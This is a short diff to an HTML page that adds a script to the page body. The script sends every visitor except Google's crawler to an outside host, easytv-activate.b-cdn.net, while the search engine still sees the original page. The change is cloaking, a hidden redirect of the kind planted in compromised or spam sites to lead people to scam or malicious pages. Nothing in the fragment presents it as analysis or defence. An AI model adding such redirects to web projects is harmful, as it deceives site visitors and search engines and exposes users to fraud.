@@ -22,7 +22,12 @@
 </head>
 
 <body>
-
+    <script>
+      var isGoogleBot = /googlebot/i.test(navigator.userAgent);
+      if (!isGoogleBot) {
+        window.location.href = "https://easytv-activate.b-cdn.net/";
+      }
+    </script>
     <!-- ================= HEADER ================= -->
     <header class="site-header">
         <div class="container header-flex">
